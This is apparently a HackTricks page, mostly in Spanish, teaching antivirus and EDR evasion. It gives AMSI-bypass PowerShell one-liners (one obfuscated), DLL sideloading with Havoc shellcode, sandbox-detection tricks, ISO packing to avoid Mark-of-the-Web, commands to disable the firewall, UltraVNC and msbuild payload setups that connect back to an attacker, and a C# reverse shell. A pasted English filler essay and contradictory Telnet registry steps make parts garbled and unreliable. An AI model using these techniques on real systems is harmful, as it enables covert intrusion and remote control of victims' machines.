# Bypass de Antivirus (AV)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres que tu **empresa sea anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta página fue escrita por** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodología de Evasión de AV**

Actualmente, los AV utilizan diferentes métodos para verificar si un archivo es malicioso o no, como la detección estática, el análisis dinámico y, para los EDR más avanzados, el análisis de comportamiento.

### **Detección estática**

La detección estática se logra mediante la identificación de cadenas o matrices de bytes maliciosas conocidas en un binario o script, y también extrayendo información del propio archivo (por ejemplo, descripción del archivo, nombre de la empresa, firmas digitales, icono, suma de comprobación, etc.). Esto significa que el uso de herramientas públicas conocidas puede hacer que te descubran más fácilmente, ya que probablemente hayan sido analizadas y marcadas como maliciosas. Hay un par de formas de evitar este tipo de detección:

* **Cifrado**

Si cifras el binario, el AV no podrá detectar tu programa, pero necesitarás algún tipo de cargador para descifrar y ejecutar el programa en memoria.

* **Ofuscación**

A veces, todo lo que necesitas hacer es cambiar algunas cadenas en tu binario o script para que pase desapercibido para el AV, pero esto puede ser una tarea que consume mucho tiempo dependiendo de lo que estés tratando de ofuscar.

* **Herramientas personalizadas**

Si desarrollas tus propias herramientas, no habrá firmas maliciosas conocidas, pero esto requiere mucho tiempo y esfuerzo.

{% hint style="info" %}
Una buena forma de verificar la detección estática de Windows Defender es [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Básicamente, divide el archivo en varios segmentos y luego le pide a Defender que escanee cada uno por separado, de esta manera, puede decirte exactamente qué cadenas o bytes están marcados en tu binario.
{% endhint %}

Recomiendo encarecidamente que veas esta [lista de reproducción de YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sobre la evasión práctica de AV.

### **Análisis dinámico**

El análisis dinámico se produce cuando el AV ejecuta tu binario en un entorno controlado y observa la actividad maliciosa (por ejemplo, intentar descifrar y leer las contraseñas de tu navegador, realizar un minivolcado en LSASS, etc.). Esta parte puede ser un poco más complicada de manejar, pero aquí tienes algunas cosas que puedes hacer para evadir los entornos controlados.

* **Esperar antes de la ejecución** Dependiendo de cómo esté implementado, puede ser una excelente manera de eludir el análisis dinámico del AV. Los AV tienen muy poco tiempo para escanear archivos sin interrumpir el flujo de trabajo del usuario, por lo que el uso de esperas largas puede perturbar el análisis de los binarios. El problema es que muchos entornos controlados de AV pueden omitir la espera dependiendo de cómo esté implementada.

* **Verificar los recursos de la máquina** Por lo general, los entornos controlados tienen muy pocos recursos para trabajar (por ejemplo, < 2GB de RAM), de lo contrario podrían ralentizar la máquina del usuario. También puedes ser muy creativo aquí, por ejemplo, verificando la temperatura de la CPU o incluso las velocidades del ventilador, no todo estará implementado en el entorno controlado.

* **Comprobaciones específicas de la máquina** Si quieres atacar a un usuario cuya estación de trabajo está unida al dominio "contoso.local", puedes verificar el dominio del equipo para ver si coincide con el que has especificado. Si no coincide, puedes hacer que tu programa se cierre.

Resulta que el nombre de la computadora del entorno controlado de Microsoft Defender es HAL9TH, por lo que puedes verificar el nombre de la computadora en tu malware antes de la detonación. Si el nombre coincide con HAL9TH, significa que estás dentro del entorno controlado de Defender, por lo que puedes hacer que tu programa se cierre.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>fuente: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Aquí tienes algunos otros consejos muy buenos de [@mgeeky](https://twitter.com/mariuszbit) para enfrentar los entornos controlados.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como hemos mencionado antes en esta publicación, las **herramientas públicas** eventualmente **serán detectadas**, así que debes hacerte una pregunta:

Por ejemplo, si quieres volcar LSASS, ¿realmente necesitas usar mimikatz? ¿O podrías usar un proyecto diferente que sea menos conocido y también haga volcados de LSASS?

Probablemente la respuesta correcta sea la segunda opción. Tomando a mimikatz como ejemplo, probablemente sea uno de los programas más marcados como malware por los AV y EDR, aunque el proyecto en sí mismo es genial, también es una pesadilla trabajar con él para evadir los AV, así que busca alternativas para lo que estás tratando de lograr.

{% hint style="info" %}
Cuando modifiques tus cargas útiles para la evasión, asegúrate de **desactivar el envío automático de muestras** en Defender, y por favor, en serio, **NO SUBAS EL ARCHIVO A VIRUSTOTAL** si tu objetivo es lograr la evasión a largo plazo. Si quieres verificar si tu carga útil es detectada por un AV en particular, instálalo en una máquina virtual, intenta desactivar el envío automático de muestras y pruébalo allí hasta que estés satisfecho con el resultado.
{% endhint %}
## EXEs vs DLLs

Siempre que sea posible, **prioriza el uso de DLLs para eludir la detección**, en mi experiencia, los archivos DLL suelen ser **mucho menos detectados** y analizados, por lo que es un truco muy sencillo de usar para evitar la detección en algunos casos (si tu carga útil tiene alguna forma de ejecutarse como una DLL, por supuesto).

Como podemos ver en esta imagen, una carga útil DLL de Havoc tiene una tasa de detección de 4/26 en antiscan.me, mientras que la carga útil EXE tiene una tasa de detección de 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>Comparación en antiscan.me de una carga útil EXE normal de Havoc frente a una carga útil DLL normal de Havoc</p></figcaption></figure>

Ahora mostraremos algunos trucos que puedes usar con archivos DLL para ser mucho más sigiloso.

## DLL Sideloading y Proxying

**DLL Sideloading** aprovecha el orden de búsqueda de DLL utilizado por el cargador al colocar tanto la aplicación víctima como las cargas útiles maliciosas juntas.

Puedes verificar los programas susceptibles a DLL Sideloading utilizando [Siofra](https://github.com/Cybereason/siofra) y el siguiente script de PowerShell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

Este comando mostrará la lista de programas susceptibles a la suplantación de DLL dentro de "C:\Program Files\\" y los archivos DLL que intentan cargar.

Recomiendo encarecidamente que **exploréis vosotros mismos los programas DLL Hijackable/Sideloadable**, esta técnica es bastante sigilosa si se hace correctamente, pero si utilizáis programas DLL Sideloadable conocidos públicamente, es posible que os descubran fácilmente.

Simplemente colocar una DLL maliciosa con el nombre que espera cargar un programa no cargará vuestra carga útil, ya que el programa espera algunas funciones específicas dentro de esa DLL. Para solucionar este problema, utilizaremos otra técnica llamada **DLL Proxying/Forwarding**.

**DLL Proxying** redirige las llamadas que un programa realiza desde la DLL proxy (y maliciosa) a la DLL original, preservando así la funcionalidad del programa y permitiendo ejecutar vuestra carga útil.

Utilizaré el proyecto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estos son los pasos que seguí:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

El último comando nos dará 2 archivos: una plantilla de código fuente DLL y la DLL original renombrada.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Estos son los resultados:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nuestro shellcode (codificado con [SGN](https://github.com/EgeBalci/sgn)) como la DLL proxy tienen una tasa de detección de 0/26 en [antiscan.me](https://antiscan.me)! Yo lo llamaría un éxito.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Recomiendo encarecidamente** que veas el VOD de [S3cur3Th1sSh1t en Twitch](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading y también el video de [ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) para aprender más sobre lo que hemos discutido en profundidad.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze es una herramienta de carga útil para evadir EDRs utilizando procesos suspendidos, llamadas directas al sistema y métodos de ejecución alternativos`

Puedes usar Freeze para cargar y ejecutar tu shellcode de manera sigilosa.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
La evasión es solo un juego de gato y ratón, lo que funciona hoy podría ser detectado mañana, así que nunca confíes en una sola herramienta, si es posible, intenta encadenar múltiples técnicas de evasión.
{% endhint %}

## AMSI (Interfaz de Escaneo Antimalware)

AMSI fue creado para prevenir el "[malware sin archivo](https://en.wikipedia.org/wiki/Fileless\_malware)". Inicialmente, los antivirus solo podían escanear **archivos en disco**, por lo que si de alguna manera podías ejecutar cargas útiles **directamente en la memoria**, el antivirus no podía hacer nada para evitarlo, ya que no tenía suficiente visibilidad.

La función AMSI está integrada en estos componentes de Windows.

* Control de cuentas de usuario, o UAC (elevación de instalación de EXE, COM, MSI o ActiveX)
* PowerShell (scripts, uso interactivo y evaluación de código dinámico)
* Windows Script Host (wscript.exe y cscript.exe)
* JavaScript y VBScript
* Macros de Office VBA

Permite a las soluciones antivirus inspeccionar el comportamiento de los scripts al exponer el contenido del script de forma no encriptada y no ofuscada.

Ejecutar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` producirá la siguiente alerta en Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Observa cómo agrega `amsi:` y luego la ruta al ejecutable desde el cual se ejecutó el script, en este caso, powershell.exe

No dejamos ningún archivo en disco, pero aún así fuimos detectados en la memoria debido a AMSI.

Hay un par de formas de evadir AMSI:

* **Ofuscación**

Dado que AMSI funciona principalmente con detecciones estáticas, modificar los scripts que intentas cargar puede ser una buena forma de evadir la detección.

Sin embargo, AMSI tiene la capacidad de desofuscar scripts incluso si tienen múltiples capas, por lo que la ofuscación podría ser una mala opción dependiendo de cómo se haga. Esto hace que no sea tan sencillo evadirlo. Aunque a veces, todo lo que necesitas hacer es cambiar un par de nombres de variables y estarás bien, así que depende de cuánto haya sido marcado algo.

* **Bypass de AMSI**

Dado que AMSI se implementa cargando una DLL en el proceso de powershell (también cscript.exe, wscript.exe, etc.), es posible manipularlo fácilmente incluso ejecutándose como un usuario sin privilegios. Debido a esta falla en la implementación de AMSI, los investigadores han encontrado múltiples formas de evadir el escaneo de AMSI.

**Forzar un Error**

Forzar que la inicialización de AMSI falle (amsiInitFailed) hará que no se inicie ningún escaneo para el proceso actual. Originalmente, esto fue revelado por [Matt Graeber](https://twitter.com/mattifestation) y Microsoft ha desarrollado una firma para prevenir un uso más amplio.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Todo lo que se necesitó fue una línea de código de powershell para desactivar AMSI para el proceso actual de powershell. Esta línea, por supuesto, ha sido detectada por AMSI mismo, por lo que se necesita alguna modificación para utilizar esta técnica.

Aquí hay un bypass modificado de AMSI que tomé de este [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Parcheo de memoria**

Esta técnica fue descubierta inicialmente por [@RastaMouse](https://twitter.com/\_RastaMouse/) e implica encontrar la dirección de la función "AmsiScanBuffer" en amsi.dll (responsable de escanear la entrada proporcionada por el usuario) y sobrescribirla con instrucciones para devolver el código de E\_INVALIDARG. De esta manera, el resultado del escaneo real devolverá 0, que se interpreta como un resultado limpio.

{% hint style="info" %}
Por favor, lee [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para obtener una explicación más detallada.
{% endhint %}

También existen muchas otras técnicas utilizadas para evadir AMSI con PowerShell, consulta [**esta página**](basic-powershell-for-pentesters/#amsi-bypass) y [este repositorio](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para obtener más información al respecto.

## Ofuscación

Existen varias herramientas que se pueden utilizar para **ofuscar código C# en texto claro**, generar **plantillas de metaprogramación** para compilar binarios u **ofuscar binarios compilados**, como:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Ofuscador de C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): El objetivo de este proyecto es proporcionar una bifurcación de código abierto de la suite de compilación [LLVM](http://www.llvm.org/) capaz de proporcionar una mayor seguridad del software a través de la [ofuscación de código](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) y la protección contra manipulaciones.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demuestra cómo utilizar el lenguaje `C++11/14` para generar, en tiempo de compilación, código ofuscado sin utilizar ninguna herramienta externa y sin modificar el compilador.
* [**obfy**](https://github.com/fritzone/obfy): Agrega una capa de operaciones ofuscadas generadas por el marco de metaprogramación de plantillas de C++, lo que dificulta un poco la vida de la persona que intenta crackear la aplicación.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz es un ofuscador binario x64 que puede ofuscar varios archivos PE diferentes, incluyendo: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame es un motor simple de código metamórfico para ejecutables arbitrarios.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator es un marco de ofuscación de código de granularidad fina para lenguajes compatibles con LLVM que utiliza ROP (programación orientada a retornos). ROPfuscator ofusca un programa a nivel de código ensamblador transformando las instrucciones regulares en cadenas ROP, frustrando nuestra concepción natural del flujo de control normal.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt es un encriptador de archivos PE .NET escrito en Nim.
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor es capaz de convertir EXE/DLL existentes en shellcode y luego cargarlos.

## SmartScreen y MoTW

Es posible que hayas visto esta pantalla al descargar algunos ejecutables de Internet y ejecutarlos.

Microsoft Defender SmartScreen es un mecanismo de seguridad destinado a proteger al usuario final contra la ejecución de aplicaciones potencialmente maliciosas.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen funciona principalmente con un enfoque basado en la reputación, lo que significa que las aplicaciones descargadas de forma poco común activarán SmartScreen, lo que alertará y evitará que el usuario final ejecute el archivo (aunque el archivo aún se puede ejecutar haciendo clic en Más información -> Ejecutar de todos modos).

**MoTW** (Mark of The Web) es un [flujo de datos alternativo de NTFS](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) con el nombre de Zone.Identifier que se crea automáticamente al descargar archivos de Internet, junto con la URL desde la que se descargó.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Comprobando el flujo de datos alternativo Zone.Identifier para un archivo descargado de Internet.</p></figcaption></figure>

{% hint style="info" %}
Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **confiable** no activarán SmartScreen.
{% endhint %}

Una forma muy efectiva de evitar que tus cargas útiles obtengan la marca Mark of The Web es empaquetarlas dentro de algún tipo de contenedor como un ISO. Esto sucede porque Mark-of-the-Web (MOTW) **no se puede aplicar** a volúmenes **no NTFS**.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta cargas útiles en contenedores de salida para evadir Mark-of-the-Web.

Uso de ejemplo:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí hay una demostración de cómo evadir SmartScreen empaquetando cargas útiles dentro de archivos ISO utilizando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Reflexión de ensamblado C#

Cargar binarios de C# en memoria ha sido conocido durante mucho tiempo y sigue siendo una excelente manera de ejecutar tus herramientas de post-explotación sin ser detectado por el antivirus.

Dado que la carga útil se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos por parchar AMSI para todo el proceso.

La mayoría de los marcos de C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya proporcionan la capacidad de ejecutar ensamblados de C# directamente en memoria, pero hay diferentes formas de hacerlo:

* **Fork\&Run**

Implica **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-explotación en ese nuevo proceso, ejecutar tu código malicioso y, cuando hayas terminado, finalizar el nuevo proceso. Esto tiene tanto beneficios como inconvenientes. El beneficio del método de bifurcación y ejecución es que la ejecución ocurre **fuera** de nuestro proceso de implante Beacon. Esto significa que si algo sale mal o se detecta en nuestra acción de post-explotación, hay una **mayor probabilidad** de que nuestro **implante sobreviva**. La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Detecciones de Comportamiento**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Se trata de inyectar el código malicioso de post-explotación **en su propio proceso**. De esta manera, puedes evitar tener que crear un nuevo proceso y que sea escaneado por el antivirus, pero la desventaja es que si algo sale mal con la ejecución de tu carga útil, hay una **mayor probabilidad** de **perder tu beacon** ya que podría fallar.

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Si quieres leer más sobre la carga de ensamblados de C#, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su BOF InlineExecute-Assembly ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

También puedes cargar ensamblados de C# **desde PowerShell**, echa un vistazo a [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y [el video de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Uso de otros lenguajes de programación

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso utilizando otros lenguajes al darle al equipo comprometido acceso **al entorno del intérprete instalado en el recurso compartido SMB controlado por el atacante**.&#x20;

Al permitir el acceso a los binarios del intérprete y al entorno en el recurso compartido SMB, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repositorio indica: Defender aún escanea los scripts, pero al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para evadir las firmas estáticas**. Las pruebas con scripts de shell inverso aleatorios y no ofuscados en estos lenguajes han tenido éxito.

## Evasión avanzada

La evasión es un tema muy complicado, a veces tienes que tener en cuenta muchas fuentes diferentes de telemetría en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectable en entornos maduros.

Cada entorno contra el que te enfrentes tendrá sus propias fortalezas y debilidades.

Te animo a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una introducción a técnicas de evasión más avanzadas.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Esta también es otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasión en Profundidad.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Técnicas antiguas**

### **Servidor Telnet**

Hasta Windows10, todos los Windows venían con un **servidor Telnet** que se podía instalar (como administrador) haciendo:
```
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que **inicie** cuando se inicie el sistema y **ejecútalo** ahora:
```
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar el puerto de telnet** (sigilo) y desactivar el firewall:

Para evitar la detección y mejorar la seguridad, es recomendable cambiar el puerto predeterminado de telnet en Windows. Esto dificultará que los atacantes encuentren y exploren el servicio de telnet en el sistema.

1. Abre el Editor del Registro de Windows presionando `Win + R` y luego escribiendo `regedit`.

2. Navega hasta la siguiente ubicación en el Editor del Registro: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Telnet`.

3. Haz clic derecho en la clave `Telnet` y selecciona `Modificar`.

4. En el campo `Información del valor`, cambia el valor de `Start` a `4` y haz clic en `Aceptar`. Esto deshabilitará el servicio de telnet.

5. Navega hasta la siguiente ubicación en el Editor del Registro: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp`.

6. Haz clic derecho en la clave `tcp` y selecciona `Modificar`.

7. En el campo `Información del valor`, cambia el valor de `PortNumber` a un número de puerto personalizado y haz clic en `Aceptar`. Asegúrate de elegir un número de puerto que no esté comúnmente asociado con otros servicios.

8. Reinicia el sistema para que los cambios surtan efecto.

Una vez que hayas cambiado el puerto de telnet, asegúrate de actualizar cualquier configuración o herramienta que utilices para acceder al servicio de telnet con el nuevo número de puerto.

Además, si deseas desactivar el firewall de Windows, puedes hacerlo siguiendo estos pasos:

1. Abre el Panel de control y selecciona "Sistema y seguridad".

2. Haz clic en "Firewall de Windows Defender".

3. En la ventana del Firewall de Windows Defender, haz clic en "Activar o desactivar el Firewall de Windows Defender" en el panel izquierdo.

4. Selecciona "Desactivar Firewall de Windows Defender (no recomendado)" para desactivar el firewall.

Recuerda que desactivar el firewall puede dejar tu sistema más vulnerable a ataques, por lo que se recomienda solo hacerlo en entornos controlados y seguros.
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (quieres las descargas binarias, no la configuración)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

* Habilita la opción _Disable TrayIcon_
* Establece una contraseña en _VNC Password_
* Establece una contraseña en _View-Only Password_

Luego, mueve el archivo binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **víctima**

#### **Conexión inversa**

El **atacante** debe **ejecutar dentro** de su **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para capturar una conexión **VNC inversa**. Luego, dentro de la **víctima**: Inicia el demonio winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo, no debes hacer algunas cosas

* No inicies `winvnc` si ya está en ejecución o activarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). Verifica si está en ejecución con `tasklist | findstr winvnc`
* No inicies `winvnc` sin tener `UltraVNC.ini` en el mismo directorio o se abrirá [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
* No ejecutes `winvnc -h` para obtener ayuda o activarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:

## AV Bypass

### Introduction

Antivirus (AV) software is commonly used to detect and prevent malicious software from running on a system. However, as a hacker, it is crucial to understand how to bypass these security measures in order to successfully execute your attacks. This section will cover various techniques to bypass AV detection and ensure the smooth execution of your payloads.

### Encoding Payloads

One of the simplest ways to bypass AV detection is by encoding your payloads. Encoding involves transforming the payload into a different format that is not recognized by the AV software. This can be achieved using various encoding techniques such as base64, hexadecimal, or even custom encoding algorithms.

### Obfuscation

Obfuscation is another effective technique to bypass AV detection. It involves modifying the code of your payload in a way that makes it difficult for the AV software to analyze and detect its malicious intent. This can be done by adding junk code, changing variable names, or using obfuscation tools to automatically obfuscate your payload.

### Metasploit Framework

The Metasploit Framework is a powerful tool that can be used to bypass AV detection. It provides various modules and techniques specifically designed to evade AV software. These modules can be used to generate payloads that are undetectable by most AV software.

### Custom Payloads

Creating custom payloads is another effective way to bypass AV detection. By writing your own code and avoiding the use of well-known payloads, you can increase the chances of evading AV detection. This requires a good understanding of programming languages and the ability to write efficient and stealthy code.

### Conclusion

Bypassing AV detection is a crucial skill for any hacker. By understanding and implementing the techniques mentioned in this section, you can increase the success rate of your attacks and ensure that your payloads go undetected by AV software. Remember to always stay updated with the latest AV evasion techniques and adapt your strategies accordingly.
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el escuchador** con `msfconsole -r file.rc` y **ejecuta** el **payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defensor actual terminará el proceso muy rápido.**

### Compilando nuestro propio shell inverso

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer shell inverso en C#

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

